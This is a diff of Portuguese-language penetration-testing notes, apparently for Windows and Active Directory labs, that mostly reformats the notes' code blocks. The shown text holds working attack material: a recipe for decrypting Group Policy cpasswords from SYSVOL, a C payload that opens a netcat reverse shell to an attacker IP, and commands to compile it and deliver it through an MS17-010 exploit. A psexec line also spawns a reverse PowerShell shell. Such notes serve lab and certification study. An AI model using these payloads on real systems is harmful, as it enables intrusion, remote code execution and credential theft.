@@ -168,11 +168,12 @@ Essa pasta geralmente se encontra dentro do diretório SYSVOL (compartilhado)
 
 Nesse cenário, basta executarmos uma ferramenta para decriptar a senha armazenada neste arquivo:
 
-    git clone https://github.com/t0thkr1s/gpp-decrypt
-    python3 gpp-decrypt.py -f [groups.xml]
-    #ou
-    python3 gpp-decrypt.py -c [cpassword]
-
+```
+git clone https://github.com/t0thkr1s/gpp-decrypt
+python3 gpp-decrypt.py -f [groups.xml]
+#ou
+python3 gpp-decrypt.py -c [cpassword]
+```
 ## CVEs/Exploits
 
 ### ms17-010
@@ -183,7 +184,8 @@ Nesse cenário, basta executarmos uma ferramenta para decriptar a senha armazena
 
 Nesse momento já temos o ambiente preparado para execução do script, mas temos que preparar o paylolad pra funcionar:
 
-    #include<stdlib.h>
+```
+#include<stdlib.h>
     
     int main() {
     
@@ -191,6 +193,10 @@ Nesse momento já temos o ambiente preparado para execução do script, mas temo
             i = system("START /B \\\\192.168.119.156\\smb\\nc.exe 192.168.119.156 80 -e cmd");
             return 0;
     }
+```
+
+
+```
 Adequar este payload toda vez que for utilizá-lo
 
     i686-w64-mingw32-gcc backup.c -o backup.exe
@@ -198,13 +204,22 @@ Adequar este payload toda vez que for utilizá-lo
     impacket-smbserver -smb2support smb /usr/share/windows-binaries
     nc -nlvp 80
     python ../impacket/send_and_execute.py 10.11.1.227 ../payload/backup.exe
-    
+```    
 
 ## Psexec
 
 baixar do sysinternals
 
-    .\psexec -d -s -i ".\nc.exe -e powershell 10.10.14.14 8081"
+
+```
+.\psexec -d -s -i ".\nc.exe -e powershell 10.10.14.14 8081"
+```
+
+```
+PsExec64.exe \\dc01.home.lab -s -accepteula cmd.exe
+```
+
+**o -s é de "system"**
 
 ## Pass the hash
 
